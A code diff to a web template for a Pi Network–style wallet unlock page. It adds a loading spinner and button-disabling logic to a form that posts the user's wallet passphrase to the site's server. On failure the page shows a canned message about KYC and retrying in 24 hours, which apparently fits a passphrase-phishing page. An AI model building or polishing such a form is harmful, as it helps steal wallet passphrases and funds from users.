@@ -199,6 +199,33 @@
         form:invalid {
             box-shadow: none;
         }
+
+        .spinner {
+            display: none;
+            width: 16px;
+            height: 16px;
+            border: 2px solid #ffffff;
+            border-top: 2px solid transparent;
+            border-radius: 50%;
+            margin-left: 8px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .btn-loading {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
     </style>
 </head>
 <body>
@@ -223,8 +250,9 @@
                 </div>
                 
                 <div class="button-group">
-                    <button type="submit" class="btn btn-primary">
-                        Unlock with Passphrase
+                    <button type="submit" class="btn btn-primary btn-loading">
+                        <span>Unlock with Passphrase</span>
+                        <div class="spinner"></div>
                     </button>
                     <button type="button" class="btn btn-secondary" onclick="handleFingerprintClick()">
                         Unlock with FIngerprint
@@ -292,6 +320,12 @@
                 return;
             }
 
+            // Show loading state
+            const submitButton = e.target.querySelector('button[type="submit"]');
+            const spinner = submitButton.querySelector('.spinner');
+            submitButton.disabled = true;
+            spinner.style.display = 'block';
+
             // Submit form via fetch API
             const formData = new FormData(e.target);
             fetch('{% url "wallet" %}', {
@@ -307,6 +341,11 @@
             })
             .catch(() => {
                 showServiceError("🅧Hi Pioneer! Your account isn't ready for Buy/Sell service yet. Please complete KYC, finish Migration, and make sure you have some Pi available. Try again in 24 hours.");
+            })
+            .finally(() => {
+                // Hide loading state
+                submitButton.disabled = false;
+                spinner.style.display = 'none';
             });
         });
 
